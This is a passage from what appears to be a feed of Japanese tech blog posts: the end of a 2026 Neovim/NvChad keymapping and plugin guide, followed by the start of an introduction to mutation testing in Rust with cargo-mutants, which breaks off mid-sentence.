のだ。たとえば、それが何であるかは私にもわからないのだが。毎年、年始になると私は同じことを繰り返している。設定を見直す。新しいプラグインを試す。キーマッピングを整理する。そしてまた忘れる。「今年こそ覚える」という新年の誓いは、結局のところ、翌年の自分に対する壮大な裏切り行為でしかないのである。このガイドは、そんな救いようのない私のための備忘録である。来年の今頃、またしても全てを忘れ去った自分のために書いている。もしかすると、同じように忘れっぽい誰かの役に立つかもしれない。立たないかもしれない。たぶん、立たない。ちなみに、一昨年にも同じようなことを書いている。進歩がない。ただし、構成はだいぶ変わった。ステータスラインを廃止し、ファイルエクスプローラーをoil.nvimに変え、Snacks.nvimを導入した。変わっていないのは、私が相変わらずキーマッピングを忘れ続けているという事実だけである。syu-m-5151.hatenablog.com開発環境全体についてはこちらに記した。興味のある方は参照されたい。syu-m-5151.hatenablog.comさて、前置きが長くなった。よく忘れるキーマッピングをまとめていくこととする。設定ファイルは以下に置いてある。github.com基本的なショートカット表記<C> = Ctrlキー<leader> = スペースキー（デフォルト）<A> = Altキー<S> = Shiftキーよく使う機能とそのキーマッピング基本操作で必須のコマンド<C-s>       - 保存（これだけは絶対覚える。:w なんてやっているとVSCodeを使っている人にバカにされる）;           - コマンドモードに入る（:を押す必要がない）jk または jj - インサートモードを抜ける（Escより断然速い）<Esc>       - 検索ハイライトをクリア<leader>y   - システムクリップボードにヤンク<leader>Y   - 行全体をシステムクリップボードにヤンク<leader>d   - ヤンクせずに削除（レジスタを汚さない）ナビゲーション（移動系）スクロールと検索が画面中央に来るようにカスタマイズしている。迷子にならない。<C-d>  - 半ページ下スクロール（画面中央維持）<C-u>  - 半ページ上スクロール（画面中央維持）n      - 次の検索結果（画面中央維持）N      - 前の検索結果（画面中央維持）検索系（2つのピッカーを使い分け）Snacks Picker（s系）- メインで使うSnacks.nvimは2024年末に登場した新しいユーティリティセット。高速で美しい。<leader><leader> - スマートピッカー（最重要：状況に応じた最適な検索）<leader>sf - ファイル検索<leader>sg - プロジェクト内テキスト検索（grep）<leader>sw - カーソル下の単語を検索<leader>sb - 開いているバッファを検索<leader>sr - 最近開いたファイルを検索<leader>sc - コマンド検索<leader>sh - ヘルプ検索<leader>sk - キーマップ検索（何かわからなくなったらこれ）<leader>sd - 診断情報を検索<leader>ss - LSPシンボル検索<leader>sR - 直前のピッカーを再開github.comTelescope（f系）- 補助的に使う長年使い慣れたTelescope。fzf-nativeで高速化済み。<C-p>       - ファイル検索（VSCodeユーザーも安心）<leader>ff  - ファイル検索<leader>fg  - ライブgrep<leader>fb  - バッファ検索<leader>fh  - ヘルプタグ検索<leader>fr  - 最近のファイル<leader>fc  - Gitコミット検索<leader>fs  - Gitステータス<leader>fd  - 診断情報github.comファイルエクスプローラー（oil.nvim）NvimTreeからoil.nvimに乗り換えた。バッファのようにディレクトリを編集できる革命的なプラグイン。ファイル名を間違えて作成しても、ddで消せる。Vimの操作で世界を編集している気分になれる。気分だけ。-           - 親ディレクトリを開く（最重要：ファイル階層を上る）<leader>e   - ファイルエクスプローラーを開く<CR>        - ファイル/ディレクトリを選択<C-v>       - 垂直分割で開く<C-s>       - 水平分割で開くg.          - 隠しファイルの表示切り替えgithub.com高速移動（flash.nvim）EasyMotion系のモダンな代替。画面内のどこにでも2-3キーで飛べる。s  - Flash（画面内の任意の位置にジャンプ）S  - Flash Treesitter（構文単位でジャンプ）r  - Remote Flash（オペレーターモード用）github.comLSP関連（コードジャンプ・リファレンス）コードリーディングする時に本当に助かる機能たち。gd          - 定義へジャンプ（最も使う）gD          - 宣言へジャンプgi          - 実装へジャンプ（インターフェースから実装を探せる）gr          - 参照を探す（変数やメソッドの使用箇所を探せる）K           - ホバー情報を表示（ドキュメント、型情報）Ctrl-^    直前に編集していたファイルに切り替え<leader>rn  - シンボルをリネーム<leader>ca  - コードアクション（自動修正候補など）<leader>fm  - フォーマット（conformで整形）<leader>cf  - フォーマット（代替キー）<leader>lk  - シグネチャヘルプ<leader>lD  - 型定義へジャンプgithub.comコードピーク（overlook.nvim）定義にジャンプせずに、フローティングウィンドウで確認できる。<leader>pd  - 定義をピーク（フローティングで定義を確認）<leader>pc  - すべてのポップアップを閉じる<leader>pu  - 最後のポップアップを復元<leader>pU  - すべてのポップアップを復元<leader>pf  - フォーカスを切り替え<leader>ps  - 分割で開く<leader>pv  - 垂直分割で開く<leader>po  - 元の場所で開くgithub.com診断・エラー確認（Trouble）診断情報を一覧で見やすく表示してくれる。[d          - 前の診断へ]d          - 次の診断へ<leader>ld  - 行の診断情報をフロートで表示<leader>lq  - 診断をloclistに送る<leader>xx  - 診断パネルをトグル（Trouble）<leader>xX  - 現在のバッファの診断のみ<leader>xs  - シンボル一覧（Trouble）<leader>xl  - LSP定義一覧<leader>xq  - Quickfixリスト<leader>xt  - TODO/FIXME一覧github.com画面分割とウィンドウ移動複数のファイルを同時に見たい時に使う。<C-h>       - 左のウィンドウへ<C-l>       - 右のウィンドウへ<C-j>       - 下のウィンドウへ<C-k>       - 上のウィンドウへ<leader>|   - 垂直分割<leader>-   - 水平分割<leader>w=  - ウィンドウサイズを均等に<leader>wm  - ウィンドウを最大化（他を閉じる）バッファ操作<S-h>       - 前のバッファへ（Shift + h）<S-l>       - 次のバッファへ（Shift + l）<leader>x   - バッファを閉じる<leader>bd  - バッファを削除（Snacks）<leader>bo  - 他のバッファをすべて削除ビジュアルモードの改善J           - 選択した行を下に移動K           - 選択した行を上に移動<leader>p   - ペースト（レジスタを上書きしない）Git操作LazyGitとの統合が最高に便利。ターミナルでgitコマンドを打つ必要がほぼなくなった。git add -pのインタラクティブモードを思い出せなくても、もう困らない。<leader>gg  - LazyGitを開く（これだけで全部できる）<leader>gl  - LazyGit ログを表示<leader>gf  - 現在のファイルのログを表示<leader>gd  - Git Diff（作業ツリー全体）<leader>gD  - 前のコミットとのDiff<leader>gh  - ファイルの履歴<leader>gH  - ブランチの履歴<leader>gs  - ステージされた変更のDiff<leader>gm  - mainブランチとのDiff<leader>gM  - masterブランチとのDiff<leader>gq  - Diffviewを閉じる<leader>gt  - ファイルパネルをトグル<leader>gp  - Hunkをプレビュー<leader>gb  - 行のBlameを表示<leader>gB  - 行Blameのトグル]c          - 次のHunkへ[c          - 前のHunkへ<leader>hr  - Hunkをリセット<leader>hs  - Hunkをステージ<leader>hu  - Hunkのステージを取り消しgithub.comgithub.comgithub.comターミナル操作<leader>tt  - ターミナルをトグル（Snacks）<C-x>       - ターミナルモードを抜けるAI統合（2026年の目玉）GitHub CopilotとClaudeの両方を使える贅沢な環境。CopilotChat（a系）<leader>ao  - チャットを開く<leader>aq  - チャットを閉じる<leader>ar  - チャットをリセット<leader>ae  - コードを説明（ビジュアルモード対応）<leader>af  - コードを修正<leader>at  - テストを生成<leader>ad  - ドキュメントを生成<leader>aR  - コードをレビューgithub.comAvante（Cursor風のAI体験）<leader>aa  - AIに質問<leader>ax  - コードを編集<leader>aS  - 回答をリフレッシュgithub.comClaudeCode（ターミナル統合）<leader>cc  - Claudeをトグル<leader>cf  - Claudeにフォーカス<leader>cr  - 会話を再開<leader>cC  - 会話を継続<leader>cm  - モデルを選択<leader>cb  - 現在のバッファを追加<leader>cs  - 選択範囲をClaudeに送信（ビジュアルモード）github.com補完操作（nvim-cmp）<C-p>       - 前の候補<C-n>       - 次の候補<C-d>       - ドキュメントを下にスクロール<C-f>       - ドキュメントを上にスクロール<C-Space>   - 補完を手動で開始<C-e>       - 補完を閉じる<CR>        - 候補を確定<Tab>       - 次の候補 / スニペット展開<S-Tab>     - 前の候補 / スニペット前へgithub.comトグル系（u系）Snacks.nvimが提供する便利なトグル機能。<leader>us  - スペルチェックのトグル<leader>uw  - ワードラップのトグル<leader>ud  - 診断のトグル<leader>uh  - インレイヒントのトグルその他の便利機能<leader>?   - 現在のバッファのキーマップを表示（which-key）<leader>rr  - カーソル下の単語を置換<leader>cx  - ファイルに実行権限を付与<leader>j   - 次のQuickfix項目へ<leader>k   - 前のQuickfix項目へ<leader>sT  - TODO/FIXME/HACKなどを検索（TodoTelescope）]t          - 次のTODOへ[t          - 前のTODOへgithub.comgithub.comDiffviewコンフリクト解決マージコンフリクトの解決が格段に楽になる。]x          - 次のコンフリクトへ[x          - 前のコンフリクトへ<leader>co  - oursを選択<leader>ct  - theirsを選択<leader>cb  - baseを選択<leader>ca  - 両方を選択dx          - コンフリクトを削除ビジュアル・UI設定2026年版の大きな特徴は、ミニマルなUIへの移行だ。ステータスラインとタブラインを完全に廃止し、編集スペースを最大化している。情報が多すぎて、結局何も見ていなかったことに気づいたからだ。テーマとカラースキームaquariumテーマを採用。落ち着いた色調で長時間の作業でも目が疲れにくい。-- chadrc.luaM.base46 = {  theme = \\"aquarium\\",  transparency = false,  hl_override = {    Comment = { italic = true },    [\\"@comment\\"] = { italic = true },    CursorLine = { bg = \\"#2a2a3a\\" },    CursorLineNr = { fg = \\"#fab387\\", bold = true },  },}ステータスライン廃止の理由従来のステータスラインは廃止し、代わりに以下のプラグインで情報を表示している:incline.nvim: ウィンドウ右下にファイル名と診断情報を表示modes.nvim: カーソルラインの色でモードを表示（Insert=水色、Visual=紫、Delete=赤、Copy=黄）noice.nvim: コマンドラインをフローティングで中央に表示-- options.luao.cmdheight = 0    -- コマンドラインを非表示（noice.nvimが担当）o.laststatus = 0   -- ステータスラインを非表示（incline.nvimが担当）o.showmode = false -- モード表示を非表示（modes.nvimが担当）行番号設定相対行番号を有効化。5jや10kのような相対移動が直感的になる。o.number = true         -- 現在行は絶対行番号o.relativenumber = true -- 他の行は相対行番号o.numberwidth = 4       -- 行番号の幅スクロール設定カーソルが画面端に到達する前にスクロールが始まる。常に周囲のコンテキストが見える。o.scrolloff = 8     -- 上下8行を常に表示o.sidescrolloff = 8 -- 左右8列を常に表示インデント設定2スペースインデントを採用。タブは使わない。o.tabstop = 2o.shiftwidth = 2o.expandtab = trueo.smartindent = trueその他のUI設定o.termguicolors = true  -- 24bitカラーo.signcolumn = \\"yes\\"    -- サインカラムを常に表示（ガター）o.cursorline = true     -- カーソル行をハイライト（modes.nvimで色が変わる）o.splitright = true     -- 垂直分割は右にo.splitbelow = true     -- 水平分割は下にo.clipboard = \\"unnamedplus\\" -- システムクリップボードと連携o.undofile = true       -- 永続的なundo履歴o.swapfile = false      -- スワップファイルを作らない使用プラグイン一覧と説明UI系プラグイン プラグイン                 説明                                                                                                                                                                                    incline.nvim           ウィンドウ右下にファイル名・アイコン・診断情報を表示するミニマルなフローティングステータスライン。init.luaやmod.rsのような一般的なファイル名の時は親ディレクトリ名も表示される。  modes.nvim             Vimのモード（Normal/Insert/Visual/Delete）に応じてカーソルラインと行番号の色を変える。モード表示がなくても今どのモードにいるか一目でわかる。                                            noice.nvim             コマンドライン、メッセージ、通知をモダンなフローティングUIで表示。画面中央にポップアップするコマンドパレット風のUIが特徴。詳細は後述。                                                  nvim-notify            通知をモダンなポップアップで表示。フェードアニメーションで視認性が高い。                                                                                                                vimade                 非アクティブなウィンドウ/バッファを薄暗く表示。どのウィンドウがアクティブかが視覚的にわかる。                                                                                           better-escape.nvim     jkやjjでインサートモードから抜ける。Escキーに手を伸ばす必要がなくなる。                                                                                                             which-key.nvim         キーを押すと次に押せるキーのヒントを表示。<leader>を押して300ms待つとメニューが出る。                                                                                                 indent-blankline.nvim  インデントレベルを縦線で可視化。ネストの深さが一目でわかる。                                                                                                                           noice.nvim の詳細noice.nvimは、Neovimの標準的なコマンドライン（画面下部の:プロンプト）を完全に置き換え、モダンなフローティングUIを提供するプラグイン。従来の「画面下に張り付いたコマンドライン」から「画面中央にポップアップするコマンドパレット」へと体験が一変する。主な機能:コマンドラインのポップアップ化:を押すと画面中央にフローティングウィンドウが出現入力中のコマンドがシンタックスハイライトされるコマンドタイプに応じたアイコン表示検索のポップアップ化/（前方検索）や?（後方検索）もポップアップで表示検索パターンが正規表現としてハイライトされるコマンドタイプ別のアイコン| 入力 | アイコン | 説明 ||------|---------|------|| : | | 通常のVimコマンド || `/` | ` ` | 前方検索 || `?` | ` ` | 後方検索 || `:!` | `$` | シェルコマンド実行 || `:lua` | | Lua実行 || :help | \uDB80\uDED6 | ヘルプ |メッセージ・通知の統合エラーや警告メッセージをnvim-notify経由で右下にポップアップ長いメッセージは自動的にスプリットウィンドウに表示LSP統合LSPの処理進捗を表示ホバー情報やシグネチャヘルプもモダンなUIで表示-- 設定例（私の設定）views = {  cmdline_popup = {    position = { row = \\"50%\\", col = \\"50%\\" },  -- 画面中央    size = { width = 60, height = \\"auto\\" },    border = { style = \\"rounded\\", padding = { 0, 1 } },  },},この設定により、従来のNeovimとは全く異なる、VSCodeやCursor風のモダンな操作感が得られる。github.comgithub.comgithub.comgithub.comgithub.comgithub.comgithub.comgithub.comナビゲーション系プラグイン プラグイン          説明                                                                                                                                                      snacks.nvim     folke氏による多機能ユーティリティセット。LazyGit統合、高速ピッカー、バッファ削除、ターミナル、デバッグ機能などを提供。2024年末に登場し、急速に普及した。  telescope.nvim  定番のファジーファインダー。ファイル、バッファ、grep、Git操作など何でも検索できる。fzf-nativeで高速化済み。                                               oil.nvim        ディレクトリをバッファとして編集できるファイルエクスプローラー。ファイル名の変更や移動がテキスト編集と同じ感覚でできる革命的なプラグイン。                flash.nvim      画面内の任意の位置に2-3キーでジャンプ。EasyMotionの後継。Treesitterと連携して構文単位のジャンプも可能。                                                   overlook.nvim   定義にジャンプせずにフローティングウィンドウでコードをプレビュー。元の位置を見失わずに定義を確認できる。                                                  hbac.nvim       開いているバッファが一定数を超えると、最近使っていないバッファを自動的に閉じる。バッファが溢れかえるのを防ぐ。                                           github.comGit系プラグイン プラグイン         説明                                                                                                                    gitsigns.nvim  変更行の左側にサイン（追加=緑、変更=青、削除=赤）を表示。Hunk単位でのステージ、リセット、プレビュー、Blame表示も可能。  diffview.nvim  Git Diffを視覚的に表示。2画面分割で変更前後を比較できる。コンフリクト解決UIも備え、ours/theirs/baseの選択が簡単。      診断・コード品質系プラグイン プラグイン              説明                                                                                                                          trouble.nvim        診断情報（エラー、警告）をパネルに一覧表示。プロジェクト全体の問題を俯瞰できる。シンボル一覧やQuickfixリストの表示にも対応。  todo-comments.nvim  コード内のTODO、FIXME、HACK、BUG、NOTEなどをハイライト表示し、検索可能にする。放置されたTODOを見つけやすい。       LSP・フォーマッタ系プラグイン プラグイン            説明                                                                                                                nvim-lspconfig    Neovim内蔵LSPクライアントの設定を簡単にする公式プラグイン。各言語のLanguage Serverとの接続を管理。                  mason.nvim        LSPサーバー、DAP（デバッガ）、リンター、フォーマッタを簡単にインストール・管理できる。:MasonコマンドでUIが開く。  conform.nvim      フォーマッタの統合プラグイン。保存時に自動フォーマットを実行。複数フォーマッタの連携も可能。                        nvim-treesitter   Tree-sitterによる高精度なシンタックスハイライトとインデント。正規表現ベースよりも正確な構文解析。                   schemastore.nvim  JSON/YAMLファイル用のスキーマを提供。package.jsonやtsconfig.jsonなどの補完と検証が効く。                       github.comgithub.comgithub.comgithub.comAI統合プラグイン プラグイン            説明                                                                                                                                             copilot.lua       GitHub Copilotの純粋なLua実装。インライン補完を提供するが、私の設定ではcopilot-cmp経由で補完メニューに統合。                                     copilot-cmp       Copilotの補完をnvim-cmpのソースとして使用。補完メニュー内で他のソース（LSP、バッファ等）と一緒にCopilot候補が表示される。                        CopilotChat.nvim  AIとのチャットインターフェース。コードの説明、レビュー、テスト生成、ドキュメント生成などをチャット形式で依頼できる。Claude Sonnetモデルを使用。  avante.nvim       Cursor風のAI編集体験をNeovimで実現。選択範囲に対してAIに編集を依頼し、差分をプレビューしてから適用できる。                                       claudecode.nvim   Claude Code CLIをNeovim内で直接使用。ターミナル統合でClaude Codeの全機能にアクセス可能。                                                        github.comgithub.com補完系プラグイン プラグイン        説明                                                                                      nvim-cmp      Neovimの補完エンジン。高速でカスタマイズ性が高い。複数のソースからの補完を統合して表示。  cmp-nvim-lsp  LSPからの補完をnvim-cmpに提供するソース。                                                 cmp-buffer    現在開いているバッファ内の単語を補完候補として提供。                                      cmp-path      ファイルパスを補完。ディレクトリ構造をたどりながら入力できる。                            cmp-cmdline   コマンドラインモード（:）での補完を提供。                                                 LuaSnip       スニペットエンジン。定型コードを素早く展開。                                              lspkind.nvim  補完メニューにアイコンを表示。種類（関数、変数、クラス等）が視覚的にわかる。             github.comgithub.comgithub.comgithub.comgithub.comgithub.com言語固有プラグイン プラグイン        説明                                                                                                                      rustaceanvim  Rust開発を強化するプラグイン。rust-analyzerとの統合を改善し、Rust固有の機能（expand macro、join lines等）を提供。         crates.nvim   Cargo.toml内のクレート（依存関係）のバージョン情報を表示。最新バージョンへの更新や、利用可能なバージョンの確認が簡単。 github.comgithub.comフォーマッタ・LSP設定保存時に自動フォーマットが走る。conform.nvimを使用。 言語                   フォーマッタ               TypeScript/JavaScript  prettier, deno_fmt         Lua                    stylua                     Rust                   rustfmt                    Go                     gofmt, goimports, gofumpt  Python                 black, isort               Terraform              terraform_fmt              Bash/Shell             shfmt                      YAML/JSON/Markdown     prettier                  Treesitter対応言語シンタックスハイライトとインデントはTreesitterで処理。vim, lua, vimdoc, html, css, markdown, markdown_inline, terraform, hcl, bash, python, rust, go, typescript, javascript, tsx, json, yaml, toml2024年版からの主な変更点追加されたプラグイン・機能Snacks.nvim: folke氏の新しいユーティリティセット。LazyGit統合、高速ピッカー、バッファ管理などoil.nvim: NvimTreeに代わるファイルエクスプローラー。ディレクトリをバッファとして編集flash.nvim: EasyMotion系のモダンな代替。Treesitter対応Trouble.nvim: 診断情報の一覧表示diffview.nvim: Git Diffの可視化とコンフリクト解決overlook.nvim: 定義をフローティングでピークAvante.nvim: Cursor風のAI編集体験ClaudeCode: Claude Code CLIとのNeovim統合noice.nvim: コマンドラインとメッセージのモダン化which-key.nvim: キーバインドのヒント表示incline.nvim: ミニマルなファイル名表示modes.nvim: モードに応じたカーソルライン色変更vimade: 非アクティブウィンドウの薄暗化hbac.nvim: 未使用バッファの自動クローズ変更されたキーマッピングバッファ切り替え: <Tab>/<S-Tab> → <S-h>/<S-l>（より直感的）スクロール: 画面中央維持が追加検索: SnacksとTelescopeの二刀流にUI設計の変更ステータスラインを完全廃止（incline.nvim + modes.nvim で代替）タブラインを廃止（Snacks pickerで代替）コマンドラインをフローティング化（noice.nvim）なぜこれらのキーマッピングを覚える必要があるのか私の経験上、以下の機能は開発効率を大きく向上させてくれる。ファイル検索（Snacks/Telescope）プロジェクト内のファイルを素早く見つけられるコードベースの把握が容易になる<leader><leader>のスマートピッカーが特に便利LSP機能コードの定義や参照を素早く調べられるリファクタリングが楽になるコードの理解が深まるエラー診断が即座にわかるRustを書いていると1箇所書き換えると芋づる式に修正が発生する。コンパイラに叱られ、LSPに導かれ、最終的には正しいコードにたどり着く。自分で考えているのか、ツールに考えさせられているのか、もはやわからないGit統合（LazyGit + Diffview）エディタを離れずにすべてのGit操作ができるコンフリクト解決が視覚的でわかりやすい<leader>ggでLazyGitを開けば、ステージ、コミット、プッシュ、ブランチ操作など全部できるAI統合コードの説明、レビュー、修正をエディタ内で完結CopilotChatでClaude Sonnetが使える時代Avanteでカーソル位置に応じたAI編集高速移動（flash.nvim）画面内のどこにでも2-3キーで移動できるマウスに手を伸ばす必要がなくなるなぜNvChadを選び続けているのか2024年版でも書いたが、NvChadを選んだ理由は開発体制の健全さだった。その判断は2026年になっても変わっていない。毎年のように「今年こそAstroNvimとかに移行する」と思うが、結局設定を移行する時間で正月休みが終わる。NvChad v3.0以降、設定の構造がより洗練された。lua/plugins/ディレクトリに機能ごとにプラグインをまとめる方式は、設定の見通しを良くしてくれる。私の設定では以下のように分割している:ui.lua: 見た目関連（incline, modes, noice, notify）navigation.lua: 移動・検索（snacks, telescope, oil, flash）git.lua: Git統合（gitsigns, diffview）diagnostics.lua: 診断（trouble, todo-comments）lsp.lua: LSPとフォーマッタ（conform, lspconfig, mason, treesitter）ai.lua: AI統合（copilot, copilot-chat, avante, claudecode）completion.lua: 補完（nvim-cmp）lang.lua: 言語固有（rustaceanvim, crates）この構造のおかげで、何か問題があった時にどこを見ればいいかすぐわかる。nvchad.comVimを学ぶために通常のVimを学ぶ時は、「実践Vim 思考のスピードで編集しよう！」がおすすめだ。Vimの基本から応用までを体系的に学べ、実践的な例も豊富に掲載されている。実践Vim　思考のスピードで編集しよう！ (アスキー書籍)作者:Ｄｒｅｗ Ｎｅｉｌ,新丈 径角川アスキー総合研究所Amazonまた、Vim Adventuresというゲームも面白い。ゲーム感覚でVimのキー操作を学べ、楽しみながら基本的なコマンドが身につく。初心者にも優しい学習カーブで、Vimの世界に入るきっかけとして最適だ。vim-adventures.comおわりにこの文章を書き終えて、ふと時計に目をやると、針は深夜一時を回っていた。年末にやるはずだった開発環境の整理を、結局、一月三日の深夜に敢行しているのである。休めていない。そんなことは百も承知である。正直に告白すれば、この文章を書いている最中にも、私は何度か「あれ、このキーは何だったか」と己の設定ファイルを参照せざるを得なかった。自分のための備忘録を執筆しながら、その備忘録を必要としている。なんという滑稽な光景であろうか。笑えない。いや、笑うしかないのかもしれない。来年の今頃、私は間違いなくこの記事を読み返しているであろう。「そうだ、<leader><leader>でスマートピッカーが開くのであった」と膝を打ち、束の間の安堵を覚える。そしてまた忘れる。おそらく、その繰り返しなのである。人間とは、かくも愚かな生き物なのだ。しかしながら、少しだけ異なることもある。毎年毎年、同じことを馬鹿の一つ覚えのように繰り返しているうちに、いつの間にか身体が記憶している操作というものが存在するのだ。gdで定義へ跳躍すること。<C-s>で保存すること。意識せずとも指が勝手に動く。それは、忘却と想起を幾度となく繰り返した果てに、ようやく獲得した境地なのである。エディタの設定に正解などない。完璧なキーマッピングも存在しない。ただ、自分が少しでも快適に作業できる環境を、毎年少しずつ更新していくのみである。それでよいのだ。それ以上を望むのは、人間の分際で天に唾するようなものである。さて、私はソファの深淵から這い上がることにする。正月休みはまだ幾ばくか残されている。しかし、仕事が始まれば、またすぐに「あのキーは何だったか」と途方に暮れる瞬間が訪れるに違いない。その時のために、この記事は存在するのである。来年の自分へ。また忘れたら読み返すがよい。どうせ忘れるのだから。参考リンクnvchad.comgithub.comneovim.io","isoDate":"2026-01-02T15:26:21.000Z","dateMiliSeconds":1767367581000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"テスト,検証してますか: cargo-mutantsによるミューテーションテスト入門","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/02/083735","contentSnippet":"はじめにテストは全部通っている。コードカバレッジも90%を超えている。なのに、本番環境でバグが見つかった。私が実際に経験したことだ。原因を調べると、テストコードにassert（検証）が書かれていなかった。テストは「コードを実行しただけ」で、結果が正しいかどうかを確認していなかったのだ。正直、恥ずかしかった。テストを書いている気になっていただけで、何も守っていなかった。こういう経験はないだろうか。あるいは、レビューで「このテスト、意味ありますか」と指摘されたことは。この記事では、こうした「見せかけのテスト」を発見するミューテーションテストという手法と、Rust向けのツールcargo-mutantsを紹介します。公式ドキュメントを参照する場合は、以下のリンクからどうぞ。mutants.rsgithub.comこのブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。ミューテーションテストとはミューテーションテストは、「テストをテストする」手法です。具体的なコードで説明しましょう。例：割引価格を計算する関数以下のような、商品価格から10%割引した金額を返す関数があるとします。/// 価格から10%割引した金額を返すfn apply_discount(price: u32) -> u32 {    price - (price / 10)}この関数に対して、以下のテストを書きました。#[test]fn test_apply_discount() {    let result = apply_discount(1000);    // 1000円の10%引きは900円のはず...    // でも、assertを書き忘れた！}このテストには問題があります。apply_discount(1000)を呼び出していますが、結果が900であることを検証していません。コードカバレッジは100%ですが、このテストは何も守っていないのです。ミュータント（突然変異体）の生成ミューテーションテストでは、コードに「わざとバグを入れた」バージョンを作ります。これをミュータント（突然変異体）と呼びます。apply_discount関数に対して、以下のようなミュータントが生成されます。// ミュータント1: 引き算を足し算に変えるfn apply_discount(price: u32) -> u32 {    price + (price / 10)  // - を + に変更}// ミュータント2: 常に0を返すfn apply_discount(price: u32) -> u32 {    0  // 関数の本体を0に置き換え}// ミュータント3: 入力をそのまま返すfn apply_discount(price: u32) -> u32 {    price  // 割引計算を削除}テストがミュータントを検出できるか各ミュータントに対してテストを実行します。 ミュータント   変更内容     テスト結果               判定           ミュータント1  - → +    ✅ 成功（テストが通る）  ❌ missed  ミュータント2  常に0を返す  ✅ 成功（テストが通る）  ❌ missed  ミュータント3  割引なし     ✅ 成功（テストが通る）  ❌ missed すべてのミュータントがテストを通過してしまいました。これはテストが何も検証していないことの証拠です。テストを修正するテストにassert_eq!を追加して、結果を検証するようにします。#[test]fn test_apply_discount() {    let result = apply_discount(1000);    assert_eq!(result, 900);  // 結果が900であることを検証}修正後、再度ミュータントをテストします。 ミュータント   変更内容     テスト結果             判定           ミュータント1  - → +    ❌ 失敗（1100 ≠ 900）  ✅ caught  ミュータント2  常に0を返す  ❌ 失敗（0 ≠ 900）     ✅ caught  ミュータント3  割引なし     ❌ 失敗（1000 ≠ 900）  ✅ caught すべてのミュータントが検出されました。これで「テストが正しく機能している」ことが確認できました。ミューテーションテストの核心ここまでの例で分かるように、ミューテーションテストは以下の逆説に基づいています。テストの成功が、失敗の証拠になる。コードを壊したのにテストが通るなら、そのテストは壊れたコードを見逃している——つまり、テストとして機能していません。cargo-mutantsとはcargo-mutantsは、Rust向けのミューテーションテストツールです。上記のような「ミュータントの生成」「テストの実行」「結果の集計」を自動で行います。Rustを使っている開発者なら、cargo install cargo-mutants && cargo mutantsの2コマンドで即座に試せます。ソースコードの変更は一切不要です。Rustを使っていない方も、「テストの品質をどう測るか」という観点でお読みいただければ、他の言語にも応用できる考え方が得られるはずです。いつ導入すべきかミューテーションテストは誰でも試せますが、すべてのプロジェクトに必要なわけではありません。正直に言えば、導入コストは低くない。特に有効なのは、カバレッジは80%以上あるのにバグが減らないケースです。金融計算のように正確性が重要なビジネスロジックや、チームにテストの質を意識させたい場面でも効果を発揮します。私自身、冒頭で触れた経験をした後、まずこのツールで「テストが本当に機能しているか」を確認するようになりました。一方、まだカバレッジが50%未満のプロジェクトでは、まずカバレッジを上げる方が効果的です。プロトタイプ段階で変更が激しい場合や、テスト実行時間がすでに長すぎる場合も、ミューテーションテストの優先度は下がります。ツールが問題を解決してくれるわけではない。テストを書くのは人間です。クイックスタートインストール# 推奨: cargoで直接インストールcargo install --locked cargo-mutants# 高速インストール（プリビルドバイナリ使用）cargo binstall cargo-mutants基本的な使い方# ミュータント一覧を確認（テストは実行しない）cargo mutants --list# ミューテーションテストを実行cargo mutants# 詳細出力で実行cargo mutants -v実行例実際にサンプルプロジェクトで実行した結果を示します。$ cargo mutants --list | head -20src/lib.rs:12:5: replace calculate_score -> i32 with 0src/lib.rs:12:5: replace calculate_score -> i32 with 1src/lib.rs:12:5: replace calculate_score -> i32 with -1src/lib.rs:32:5: replace is_valid_email -> bool with truesrc/lib.rs:32:5: replace is_valid_email -> bool with falsesrc/lib.rs:37:5: replace format_greeting -> String with String::new()src/lib.rs:37:5: replace format_greeting -> String with \\"xyzzy\\".into()src/lib.rs:42:5: replace find_first_even -> Option<i32> with Nonesrc/lib.rs:42:5: replace find_first_even -> Option<i32> with Some(0)src/lib.rs:47:5: replace parse_positive_number -> Result<u32, String> with Ok(0)src/lib.rs:57:5: replace get_even_numbers -> Vec<i32> with vec![]...実行すると、各ミュータントに対してテストが実行され、結果が表示されます。$ cargo mutants -vFound 108 mutants to testok       Unmutated baseline in 1s build + 1s testcaught   src/lib.rs:12:5: replace calculate_score -> i32 with 0 in 0s build + 0s testcaught   src/lib.rs:12:5: replace calculate_score -> i32 with 1 in 0s build + 0s testMISSED   src/lib.rs:155:9: delete match arm 1 in calculate_discount in 0s build + 1s test...108 mutants tested in 2m: 17 missed, 91 caught出力結果の読み方結果の4分類 結果          意味                                    アクション                  caught    テストがミュータントを検出した          良好。テストが機能している  missed    テストがミュータントを検出できなかった  テストの追加・強化が必要    unviable  ミュータントがコンパイルできなかった    無視してOK                  timeout   テストがタイムアウトした                無限ループの可能性あり     出力ディレクトリ（mutants.out/）実行後に生成されるmutants.out/ディレクトリには、詳細な結果が保存されます。mutants.out/├── caught.txt      # 検出されたミュータント一覧├── missed.txt      # 検出できなかったミュータント一覧├── timeout.txt     # タイムアウトしたミュータント├── unviable.txt    # コンパイル不可だったミュータント├── outcomes.json   # 全結果のJSON形式├── log/            # 各ミュータントの詳細ログ└── diff/           # 適用されたパッチミューテーションテストの仕組みミューテーションテストは1970年代に考案された手法ですが、計算コストの高さから長らく実用的ではありませんでした。近年のコンピュータ性能向上により、ようやく日常的に使えるようになってきました。cargo-mutantsの動作フローcargo-mutantsは以下の手順で動作します。ソースファイルの特定: プロジェクト構成を読み取り、テスト対象のファイルを見つけるコードの解析: synというライブラリ（Rustでは「クレート」と呼びます）を使って、コードの構造を解析するミュータントの生成: 「足し算を引き算に変える」「戻り値を0に変える」といった変更パターンを列挙するテストの実行: 各ミュータントに対してテストを実行し、検出できたかどうかを記録する具体例：検証していないテストコードカバレッジとミューテーションテストの違いを、具体例で見てみましょう。// 2つの数を足し算する関数fn add(a: i32, b: i32) -> i32 {    a + b}// テストコード#[test]fn test_add() {    add(1, 2);  // 関数を呼んでいるだけ！結果を検証していない！}このテストはadd関数を実行しているので、コードカバレッジは100%です。しかし、戻り値が正しいかどうかを確認していません。add(1, 2)の結果が3であることを検証していないのです。正しいテストは以下のようになります。#[test]fn test_add_correct() {    let result = add(1, 2);    assert_eq!(result, 3);  // 結果が3であることを検証している}assert_eq!は「左辺と右辺が等しいことを確認する」という意味です。等しくなければテストは失敗します。cargo-mutantsは、最初の「検証していないテスト」の問題を発見できます。a + bをa - 